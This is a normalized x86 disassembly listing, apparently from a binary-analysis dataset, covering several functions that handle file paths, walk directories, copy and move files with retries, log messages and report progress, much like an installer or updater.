mov ecx [ ebp + 0x8 ]
push ecx
push r--data
push 0x20
lea edx [ ebp - 0x28 ]
push edx
call sub_404940
add esp 0x10
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x4 ] eax
movzx eax [ rw-data ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x4 ] r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_4047e0
add esp 0x4
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
jmp r-xdata
sub_404940
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
lea ecx [ ebp + 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
sub ecx 0x1
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_413c43
add esp 0x10
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_404990
push ebp
mov ebp esp
sub esp 0x244
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov ecx [ rw-data ]
push ecx
push r--data
push 0x104
lea edx [ ebp - 0x240 ]
push edx
call sub_401540
add esp 0x10
push r--data
lea eax [ ebp - 0x240 ]
push eax
call sub_412b5e
add esp 0x8
push eax
lea ecx [ ebp - 0x14 ]
call sub_402750
lea ecx [ ebp - 0x14 ]
call sub_4027d0
test eax eax
jne r-xdata
mov [ ebp - 0x34 ] 0x0
xor ecx ecx
mov [ ebp - 0x33 ] ecx
mov [ ebp - 0x2f ] ecx
mov [ ebp - 0x2b ] ecx
mov [ ebp - 0x27 ] ecx
mov [ ebp - 0x23 ] ecx
mov [ ebp - 0x1f ] ecx
mov [ ebp - 0x1b ] ecx
mov [ ebp - 0x17 ] cx
mov [ ebp - 0x15 ] cl
lea ecx [ ebp - 0x14 ]
call sub_4027d0
push eax
push 0x1
push 0x20
lea edx [ ebp - 0x34 ]
push edx
call sub_412518
add esp 0x10
mov eax [ r--data ]
mov [ ebp - 0x10 ] eax
mov ecx [ r--data ]
mov [ ebp - 0xc ] ecx
mov dx [ r--data ]
mov [ ebp - 0x8 ] dx
push 0x9
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
call sub_413c60
add esp 0xc
neg eax
sbb eax eax
add eax 0x1
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov [ ebp - 0x242 ] 0x1
lea ecx [ ebp - 0x14 ]
call sub_402770
mov al [ ebp - 0x242 ]
mov [ ebp - 0x241 ] 0x0
lea ecx [ ebp - 0x14 ]
call sub_402770
mov al [ ebp - 0x241 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
sub_404ab0
push ebp
mov ebp esp
push 0x253
push r--data
call sub_409400
add esp 0x8
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
call sub_4080e0
pop ebp
retn
sub_404ae0
push ebp
mov ebp esp
sub esp 0xf3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0xc ] eax
movzx eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push ecx
push r--data
push 0x104
lea edx [ ebp - 0x218 ]
push edx
call sub_401540
add esp 0x10
lea eax [ ebp - 0x218 ]
push eax
mov ecx rw-data
call sub_407530
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_404e30
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx rw-data
call sub_407340
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x1 ] 0x1
movzx edx [ rw-data ]
test edx edx
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
movzx ecx [ rw-data ]
test ecx ecx
je r-xdata
movzx ecx [ ebp - 0x1 ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
movzx ecx [ rw-data ]
test ecx ecx
je r-xdata
push rw-data
lea ecx [ ebp - 0x420 ]
push ecx
call sub_412d52
add esp 0x8
lea edx [ ebp - 0x420 ]
push edx
call sub_4066c0
add esp 0x4
movzx eax al
test eax eax
jne r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
call sub_4080e0
mov ecx [ ebp - 0xc ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push r--data
call sub_413426
add esp 0x4
test eax eax
jne r-xdata
call sub_405e10
mov [ ebp - 0x8 ] eax
mov ecx rw-data
call sub_407620
call sub_404d80
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x420 ]
push edx
push r--data
push 0x258
lea eax [ ebp - 0xb28 ]
push eax
call sub_401540
add esp 0x10
lea ecx [ ebp - 0x678 ]
call sub_404d60
lea ecx [ ebp - 0x678 ]
push ecx
lea edx [ ebp - 0xb28 ]
push edx
call sub_405160
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x22
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov edx [ ebp - 0x8 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0xd30 ]
push eax
call sub_4066c0
add esp 0x4
movzx ecx al
test ecx ecx
je r-xdata
push r--data
lea eax [ ebp - 0x678 ]
push eax
mov ecx rw-data
call sub_4073d0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x678 ] 0x0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4048d0
add esp 0x4
lea edx [ ebp - 0xd30 ]
push edx
push r--data
push 0x104
lea eax [ ebp - 0xf38 ]
push eax
call sub_401540
add esp 0x10
lea ecx [ ebp - 0xf38 ]
push ecx
call sub_4045f0
add esp 0x4
movzx edx [ rw-data ]
test edx edx
je r-xdata
mov [ ebp - 0xf3c ] r--data
mov [ ebp - 0xf3c ] r--data
jmp r-xdata
mov eax [ ebp - 0xf3c ]
push eax
call sub_4047e0
add esp 0x4
push r--data
call sub_41335a
add esp 0x4
mov [ ebp - 0x1 ] 0x0
sub_404d80
push ebp
mov ebp esp
sub esp 0x828
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x210 ]
push eax
call sub_4066c0
add esp 0x4
movzx ecx al
test ecx ecx
jne r-xdata
push r--data
lea edx [ ebp - 0x210 ]
push edx
push 0x0
lea ecx [ ebp - 0x828 ]
call sub_406680
push r--data
lea eax [ ebp - 0x210 ]
push eax
push 0x1
lea ecx [ ebp - 0x828 ]
call sub_406680
push r--data
lea ecx [ ebp - 0x210 ]
push ecx
push 0x2
lea ecx [ ebp - 0x828 ]
call sub_406680
lea edx [ ebp - 0x828 ]
push edx
push rw-data
lea eax [ ebp - 0x210 ]
push eax
call sub_406750
add esp 0xc
mov eax 0x22
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
sub_404e30
push ebp
mov ebp esp
sub esp 0x83c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x620 ]
push eax
call sub_4066c0
add esp 0x4
movzx ecx al
test ecx ecx
jne r-xdata
push 0x104
lea edx [ ebp - 0x210 ]
push edx
lea eax [ ebp - 0x620 ]
push eax
call [ GetLongPathNameW@IAT ]
test eax eax
jne r-xdata
mov eax 0x22
jmp r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
push r--data
push 0x104
lea edx [ ebp - 0x418 ]
push edx
call sub_401540
add esp 0x10
lea eax [ ebp - 0x620 ]
push eax
push r--data
push 0x104
lea ecx [ ebp - 0x838 ]
push ecx
call sub_401540
add esp 0x10
lea edx [ ebp - 0x418 ]
push edx
call sub_4045f0
add esp 0x4
lea eax [ ebp - 0x418 ]
push eax
lea ecx [ ebp - 0x210 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
push 0x1
lea edx [ ebp - 0x418 ]
push edx
lea eax [ ebp - 0x210 ]
push eax
call sub_401590
add esp 0xc
mov [ ebp - 0x62c ] eax
mov [ ebp - 0x624 ] 0xa
mov [ ebp - 0x628 ] 0x0
mov eax 0x22
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x62c ] 0x0
je r-xdata
mov ecx [ ebp - 0x628 ]
mov edx [ ebp - 0x628 ]
add edx 0x1
mov [ ebp - 0x628 ] edx
cmp ecx 0xa
jge r-xdata
lea eax [ ebp - 0x210 ]
push eax
lea ecx [ ebp - 0x838 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
push 0x1
lea edx [ ebp - 0x210 ]
push edx
lea eax [ ebp - 0x838 ]
push eax
call sub_401590
add esp 0xc
mov [ ebp - 0x62c ] eax
cmp [ ebp - 0x62c ] 0x0
je r-xdata
mov edx [ ebp - 0x62c ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax [ ebp - 0x62c ]
jmp r-xdata
mov eax [ ebp - 0x62c ]
push eax
call [ GetLastError@IAT ]
push eax
lea ecx [ ebp - 0x210 ]
push ecx
mov edx [ ebp - 0x628 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x18
push 0x64
call [ Sleep@IAT ]
push 0x1
lea eax [ ebp - 0x418 ]
push eax
lea ecx [ ebp - 0x210 ]
push ecx
call sub_401590
add esp 0xc
mov [ ebp - 0x62c ] eax
jmp r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
lea eax [ ebp - 0x418 ]
push eax
call sub_4045f0
add esp 0x4
mov [ ebp - 0x62c ] eax
cmp [ ebp - 0x62c ] 0x0
je r-xdata
mov ecx [ ebp - 0x62c ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
lea edx [ ebp - 0x210 ]
push edx
call sub_4045f0
add esp 0x4
push 0x1
lea eax [ ebp - 0x210 ]
push eax
lea ecx [ ebp - 0x418 ]
push ecx
call sub_401590
add esp 0xc
mov [ ebp - 0x83c ] eax
cmp [ ebp - 0x83c ] 0x0
je r-xdata
cmp [ ebp - 0x62c ] 0x7
jne r-xdata
mov [ rw-data ] 0x1
xor eax eax
mov ecx [ ebp - 0x62c ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
push 0x4
push 0x0
lea edx [ ebp - 0x418 ]
push edx
call [ MoveFileExW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x62c ]
jmp r-xdata
mov edx [ ebp - 0x83c ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
lea ecx [ ebp - 0x418 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
lea eax [ ebp - 0x418 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
jmp r-xdata
sub_405160
push ebp
mov ebp esp
sub esp 0x26c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x26c ] 0x1
mov [ ebp - 0x264 ] r--data
push r--data
lea eax [ ebp - 0x260 ]
push eax
push 0x1
mov ecx [ ebp - 0x264 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4084b0
add esp 0x14
mov [ ebp - 0x268 ] eax
push 0x257
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_413d20
add esp 0xc
mov edx [ ebp + 0xc ]
mov [ edx + 0x257 ] 0x0
mov eax [ ebp - 0x268 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
sub_4051f0
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x18 ] 0x0
push 0x1
mov ecx [ ebp - 0xc ]
mov edx [ ecx ]
mov ecx [ ebp - 0xc ]
mov eax [ edx ]
call eax
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
jmp r-xdata
sub_405250
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] eax
mov esp ebp
pop ebp
retn 0x4
sub_4052a0
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov eax 0x28
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
call eax
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
fild [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
fidiv [ edx + 0x8 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fmul [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
push ecx
fstp [ esp ]
call sub_4080f0
add esp 0x4
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_405340
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
add eax [ edx + 0x4 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x4 ] edx
jmp r-xdata
xor eax eax
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
call edx
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
add ecx [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
fild [ ebp - 0x8 ]
fidiv [ ebp - 0xc ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fmul [ r--data ]
fadd [ r--data ]
fstp [ ebp - 0x1c ]
fld [ ebp - 0x1c ]
push ecx
fstp [ esp ]
call sub_4080f0
add esp 0x4
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov eax [ ebp - 0x14 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
sub_405400
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
call eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
fild [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
fidiv [ edx + 0x8 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fmul [ r--data ]
fadd [ r--data ]
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
push ecx
fstp [ esp ]
call sub_4080f0
add esp 0x4
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
mov [ rw-data ] 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_405490
push ebp
mov ebp esp
sub esp 0x69c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x67c ] 0x0
mov eax [ ebp + 0x8 ]
push eax
push r--data
push 0x104
lea ecx [ ebp - 0x210 ]
push ecx
call sub_401540
add esp 0x10
lea edx [ ebp - 0x210 ]
push edx
call sub_4057b0
add esp 0x4
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x468 ]
push eax
mov ecx [ ebp - 0x46c ]
push ecx
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x214 ] eax
cmp [ ebp - 0x214 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x67c ]
push r--data
lea edx [ ebp - 0x43c ]
push edx
call sub_412c84
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
push r--data
lea eax [ ebp - 0x43c ]
push eax
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebp - 0x468 ]
push eax
mov ecx [ ebp - 0x214 ]
push ecx
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x43c ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push r--data
push 0x104
lea eax [ ebp - 0x678 ]
push eax
call sub_401540
add esp 0x14
mov ecx [ ebp - 0x468 ]
and ecx 0x10
je r-xdata
mov edx [ ebp - 0x214 ]
push edx
call [ FindClose@IAT ]
mov eax [ ebp + 0x8 ]
push eax
call sub_405850
add esp 0x4
mov [ ebp - 0x688 ] eax
cmp [ ebp - 0x688 ] 0x0
jne r-xdata
lea edx [ ebp - 0x678 ]
push edx
call sub_405850
add esp 0x4
mov [ ebp - 0x680 ] eax
cmp [ ebp - 0x680 ] 0x0
jne r-xdata
lea edx [ ebp - 0x678 ]
push edx
push r--data
push 0x104
lea eax [ ebp - 0x678 ]
push eax
call sub_401540
add esp 0x10
mov ecx [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x678 ]
push edx
call sub_405490
add esp 0x8
mov [ ebp - 0x67c ] eax
cmp [ ebp - 0x67c ] 0x0
je r-xdata
push 0x14
call sub_412ddb
add esp 0x4
mov [ ebp - 0x694 ] eax
cmp [ ebp - 0x694 ] 0x0
je r-xdata
mov eax 0x5
jmp r-xdata
push 0x14
call sub_412ddb
add esp 0x4
mov [ ebp - 0x690 ] eax
cmp [ ebp - 0x690 ] 0x0
je r-xdata
mov eax 0x5
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x67c ]
push eax
lea ecx [ ebp - 0x678 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov eax [ ebp - 0x67c ]
jmp r-xdata
mov [ ebp - 0x69c ] 0x0
mov ecx [ ebp - 0x694 ]
call sub_405990
mov [ ebp - 0x69c ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
mov [ ebp - 0x698 ] 0x0
mov ecx [ ebp - 0x690 ]
call sub_405920
mov [ ebp - 0x698 ] eax
jmp r-xdata
mov eax [ ebp - 0x68c ]
push eax
mov ecx [ ebp + 0xc ]
call sub_405250
mov ecx [ ebp - 0x67c ]
push ecx
mov edx [ ebp - 0x688 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
jmp r-xdata
mov ecx [ ebp - 0x69c ]
mov [ ebp - 0x68c ] ecx
mov edx [ ebp - 0x688 ]
push edx
mov eax [ ebp - 0x68c ]
mov edx [ eax ]
mov ecx [ ebp - 0x68c ]
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x67c ] eax
cmp [ ebp - 0x67c ] 0x0
je r-xdata
mov edx [ ebp - 0x684 ]
push edx
mov ecx [ ebp + 0xc ]
call sub_405250
mov eax [ ebp - 0x67c ]
push eax
mov ecx [ ebp - 0x680 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov eax [ ebp - 0x67c ]
jmp r-xdata
mov eax [ ebp - 0x698 ]
mov [ ebp - 0x684 ] eax
mov ecx [ ebp - 0x680 ]
push ecx
mov edx [ ebp - 0x684 ]
mov eax [ edx ]
mov ecx [ ebp - 0x684 ]
mov edx [ eax + 0x4 ]
call edx
mov [ ebp - 0x67c ] eax
cmp [ ebp - 0x67c ] 0x0
je r-xdata
sub_4057b0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push eax
call sub_411794
add esp 0x4
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_411794
add esp 0x4
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x8 ]
lea eax [ edx + edx + 0x2 ]
push eax
call sub_412584
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
mov edx [ rw-data ]
push edx
mov eax [ ebp - 0x10 ]
push eax
call sub_412d52
add esp 0x8
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
lea eax [ edx + ecx * 2 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call sub_412d24
add esp 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
lea edx [ ecx + eax * 2 ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ ecx ] ax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x4 ]
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_405850
push ebp
mov ebp esp
sub esp 0x14
push r--data
call sub_411794
add esp 0x4
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
push eax
call sub_411794
add esp 0x4
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
lea eax [ ecx + edx + 0x1 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x1
push ecx
call sub_412584
add esp 0x4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] edx
push r--data
mov eax [ ebp - 0x14 ]
push eax
call sub_412d52
add esp 0x8
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
lea eax [ edx + ecx * 2 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
call sub_412d24
add esp 0x8
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax * 2 ]
mov [ ebp - 0x14 ] edx
push r--data
mov eax [ ebp - 0x14 ]
push eax
call sub_412d24
add esp 0x8
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
lea eax [ edx + ecx * 2 ]
mov [ ebp - 0x14 ] eax
xor ecx ecx
mov edx [ ebp - 0x14 ]
mov [ edx ] cx
mov eax [ ebp - 0x14 ]
add eax 0x2
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_405920
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_405960
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_405960
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_405990
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_405960
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4059d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_405a00
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call sub_41226d
add esp 0x4
sub_405a20
push ebp
mov ebp esp
sub esp 0x24
push r--data
call sub_405bd0
add esp 0x4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push r--data
call sub_4011d0
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
xor eax eax
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx ]
cmp edx 0x23
jne r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x4 ]
push eax
push r--data
call sub_4011d0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
push r--data
mov ecx [ ebp - 0x10 ]
push ecx
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov eax 0x5
jmp r-xdata
push r--data
mov eax [ ebp - 0x10 ]
push eax
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
push 0x14
call sub_412ddb
add esp 0x4
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push r--data
mov ecx [ ebp - 0x10 ]
push ecx
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x20 ] 0x0
mov ecx [ ebp - 0x18 ]
call sub_405920
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax 0x5
jmp r-xdata
push 0x14
call sub_412ddb
add esp 0x4
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov [ ebp - 0x24 ] 0x0
mov ecx [ ebp - 0x1c ]
call sub_405990
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x14 ]
mov eax [ edx ]
mov ecx [ ebp - 0x14 ]
mov edx [ eax + 0x4 ]
call edx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax 0xf
jmp r-xdata
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
push eax
